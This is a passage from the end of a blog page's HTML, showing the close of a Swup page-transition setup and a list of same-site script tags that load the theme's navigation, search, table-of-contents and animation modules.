            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>











    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





	
</body>

</html>